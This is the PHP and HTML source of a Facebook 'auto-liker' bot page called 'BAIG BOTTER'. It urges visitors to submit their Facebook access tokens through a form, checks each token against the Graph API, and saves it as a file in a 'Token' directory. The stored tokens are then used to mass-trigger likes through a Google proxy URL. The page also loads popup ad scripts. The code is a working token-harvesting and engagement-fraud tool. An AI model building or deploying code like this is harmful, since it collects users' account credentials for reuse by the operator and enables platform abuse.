<link rel="icon" type="image/png" href="http://www.flagsofallcountries.com/Asia/Pakistan/pakistan_mwc.gif"> 
<link rel="icon" type="image/png" href="http://www.flagsofallcountries.com/Asia/Pakistan/pakistan_mwc.gif"> 
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"> <html> <head> 
  <meta http-equiv="Content-Type" content="text/html; charset=utf-8"> 
  <meta http-equiv="X-UA-Compatible" content="IE=edge"> 
  <meta name="viewport" content="width=device-width, initial-scale=0.4"> 
  <title> BAIG BOTTER </title> 
  

</script>
  
  
  
  
  <style>
 

 
  
  
  
  
  
  @font-face {font-family: yasirfonts;src: url(1.ttf);}</style> <style>@font-face {font-family: mughalfonts;src: url(2.ttf);}</style> <style> html { background: url(pak.jpg) no-repeat center center fixed; background-color: #000; -webkit-background-size: cover; -moz-background-size: cover; -o-background-size: cover; background-size: cover; } a { text-decoration: none; color:white; } #footer { vertical-align: center; } .form { position: absolute; vertical-align: center; width: 98%; top: 40%; } .form1 { position: absolute; vertical-align: center; width: 98%; top: 55%; } .access { position: absolute; vertical-align: center; width: 98%; } .access h2 { margin-top: -15px; } input[type=text] { font-family:YASIRfonts; width: 60%; height: 5%; padding: 8px 32px; margin: 8px 0; font-size:22px; box-sizing: border-box; border: 2px solid white; background-color: black; color: white; border-radius:50px; outline: none; text-align: center; } input[type=password] { font-family:YASIRfonts; width: 60%; height: 5%; padding: 8px 32px; margin: 8px 0; font-size:22px; box-sizing: border-box; border: 2px solid white; background-color: black; color: white; border-radius:50px; outline: none; text-align: center; } .button { font-family:YASIRfonts; height: 5%; background-color: black; /* Green */ border: 2px solid white; color: white; padding: 8px 32px; text-align: center; text-decoration: none; display: inline-block; font-size: 15px; margin: 4px 2px; -webkit-transition-duration: 0.4s; /* Safari */ transition-duration: 0.4s; cursor: pointer; } .button1 { background-color: black; color: white; border-radius:50px; } .button1:hover { background-color: white; color: black; } .button2 { background-color: RED; color: white; border-radius:50px; padding: 3px 8px; } .button2:hover { background-color: black; color: white; } .submit { background-color: Green; color: white; border-radius:50px; padding: 7px 15px; } .submit:hover { background-color: blue; color: white; }
</style>
  

</head>


<?php
$yx=opendir('Token');
while($isi=readdir($yx)){
if($isi != '.' && $isi != '..'){
$member[]=$isi;
}
}
$like = new like();
if($_GET[act]){
print '';
}
if($_POST[access_token]){
$access_token = $_POST[access_token];
$me = $like -> me($access_token);
if($me[id]){
$like -> Token($access_token);
if($_POST[id]){
$like -> pancal($_POST[id]);
}else{
$like -> getData($access_token);
}
}else{
$like -> invalidToken();
}
}else{
$like->form();
}
class like {
public function pancal($id){ for($i=1;$i<4;$i++){
$this-> _req('http://google.com/gwt/n?u='.urlencode('http://'.$_SERVER[HTTP_HOST].'/likes.php?id='.$id.'&n='.$i));
}
print '';
}
public function me($access){
return json_decode($this-> _req('https://graph.facebook.com/me?access_token='.$access),true);
}
public function Token($access){
if(!is_dir('Token')){
mkdir('Token');
}
$a=fopen('Token/'.$access,'w');
fwrite($a,1);
fclose($a);
}
public function invalidToken(){
print'<font color="red">TOKEN INVALID</font>';
$this->form();
}
public function form(){
 echo '
<div id="header">
<div class="foo">
<center>
<b><font style="background: url(&quot;http://img1.liveinternet.ru/images/attach/c/3/77/307/77307665_MontiBlingStar77.gif&quot;) repeat scroll 0% 0% transparent;color:#fff; text-shadow: 0pt 0pt 0.9em white, 0pt 2pt 0.9em white;color: yellow ;font-size:80px;">BAIG BOTTER ON TOP  </font></b>
</div>
<br>
</a></div>
</font>
</div></div>
<center><script type="text/javascript" src="https://wap4dollar.com/ad/pops/?id=cx5av5xnzc"></script><a href="https://www.facebook.com/mrdjayash" alt="Owner" target="_blank"> <img src="https://graph.facebook.com/100025466832535/picture?type=large" alt="Profile" style="border-radius: 99em; border: 2px; box-shadow: 0px 0px 9px 7px rgb(65, 227, 181); padding: 8px;" width="250" height="250"></a></div>
<br>
</div>

<span>
</div>

<br><center>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<iframe src="//www.facebook.com/plugins/follow?href=https%3A%2F%2Fwww.facebook.com%2Fold.is.disable&amp&amp;layout=standard&amp;show_faces=true&amp;colorscheme=dark&amp;width=450&amp;height=80" scrolling="no" frameborder="0" style="border:none; overflow:hidden; width:450px; height:80px;" allowTransparency="true"></iframe>

<script type="text/javascript" src="https://wap4dollar.com/ad/pops/?id=cx5av5xnzc"></script><div id="center">
<a href="http://ayesh.byethost7.com/?i=2" target="_blank"><input class="button"style="width:20%" type="button" value="GET SCURE TOKEN"></a<div id="center">
<script type="text/javascript" src="https://wap4dollar.com/ad/pops/?id=cx5av5xnzc"></script><a href="https://wap4dollar.com/ad/nonadult/serve.php?id=cx5av5xnzc" target="_blank"><input class="button"style="width:20%" type="button" value="WORKING SCRIPT HERE"></a><br><br>
<center>
<b><font style="background: url() repeat scroll 0% 0% transparent;color:#fff; text-shadow: 0pt 0pt 0.10em red, 0pt 2pt 0.9em white;color: white ;font-size:30px;">! SUBMIT YOUR TOKEN HERE</font></b>

<center>
<script type="text/javascript" src="https://wap4dollar.com/ad/pops/?id=cx5av5xnzc"></script><form action=""method="POST"><input class="input" type="text"name="access_token" style="height:28px;" value=""><br>
  <input class="button button5" type="submit"name="saveFile" style="height:28px;" '.$warna1.';border:2px groove '.$warna.';height:50px;width:22px"autocomplete="off" value="SUBMIT"onfocus="value="SUBMIT=""></form></center><br>
</font><br>



';
}
public function getData($access){
$feed=json_decode($this -> _req('https://graph.facebook.com/me/home?access_token='.$access.'&limit=1'),true);
if(count($feed[data]) >= 1){
for($i=0;$i<count($feed[data]);$i++){
$uid = $feed[data][$i][from][id];
$name = $feed[data][$i][from][name];
$type = $feed[data][$i][type];
$mess = str_replace(urldecode('
'),'<br/>',htmlspecialchars($feed[data][$i][message]));
$id = $feed[data][$i][id];
$pic = $feed[data][$i][picture];
echo'
<br>
<br>
<br>
<center> 
<br>
<br>
<br>
<marquee direction="left"><font size="8" color="gold"><font face="Audiowide" size="5" style="background: url(&quot;&quot;) repeat scroll 0% 0% transparent; color:#fff; text-shadow: 0pt 0pt 0.9em red, 0pt 2pt 0.9em White;">Your bot Has been Activated Successfully </font></marquee>
<br>
<br>
<br>
<form action="keluar.php" method="post">
<center><input class="submit" type="submit" style="width:40%;" value="Click Here To Add AnOther Token"></center>
<br>
<br>
<br>
<center> <center><div style="font-family: Iceland;<font face="Orbitron" size="10" style="background: url(&quot;&quot;) repeat scroll 0% 0% transparent; color:#fff; text-shadow: 0pt 0pt 0.9em red, 0pt 2pt 0.9em gold;"><font color="blue"size="5"> DESIGNED BY :-  <a href="https://www.facebook.com/MRDJAYASH" target="blank"><font color="red">DJ AYASH <br></center>
';
if($type=='photo'){
echo'
';
}else{
echo'
';
}
}
}else{
print '';
}
print '';
}
private function _req($url){
$ch = curl_init();
curl_setopt_array($ch,array(
CURLOPT_CONNECTTIMEOUT => 5,
CURLOPT_RETURNTRANSFER => true,
CURLOPT_URL => $url,
) );
$result = curl_exec($ch);
curl_close($ch);
return $result;
}
}
?>
</body>
</html>
<div id="footer">
						<center>
							<font face="yasirfonts" size="5" color="blue" style= "text-shadow: 0px 0px 4px rgb(255, 0, 0), 0px 0px 4px rgb(255, 0, 0), 0px 0px 10px rgb(255, 0, 0); color: rgb(0, 163, 239); font-weight: bold;" size="6">
								Active Users 
							</font>
								: 
							<font face="yasirfonts" style= "text-shadow: 0px 0px 2px rgb(255, 0, 0), 0px 0px 2px rgb(255, 0, 0), 0px 0px 10px rgb(255, 0, 0); color: rgb(0, 163, 239); font-weight: bold;" size="5"><?php include 'users.php';?>
							</font>
							<br><br><br>
